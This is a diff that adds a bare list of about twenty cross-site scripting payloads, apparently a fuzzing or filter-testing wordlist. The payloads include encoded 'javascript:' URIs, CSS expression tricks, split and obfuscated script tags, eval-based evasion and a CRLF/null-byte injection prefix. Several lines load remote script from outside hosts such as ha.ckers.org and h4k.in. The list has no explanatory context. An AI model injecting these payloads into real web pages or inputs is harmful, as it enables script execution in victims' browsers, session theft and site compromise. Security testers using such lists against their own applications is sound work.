@@ -1,0 +1,23 @@
+<A HREF="http://www.hackers.com/">XSS</A>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<BASE HREF="javascript:alert('XSS');//">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://hackers.com/xss.js"></SCRIPT>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<body onload=;;;;;;;;;;;_=alert;_(1);;;;
+<body <body onload=;;;;;al:eval('al'+'ert(1)');;>
+0%0d%0a%00<script src=//h4k.in>
+
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
+<body/””$/onload=x={doc:parent[’document’]};x.doc.writeln(1)
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
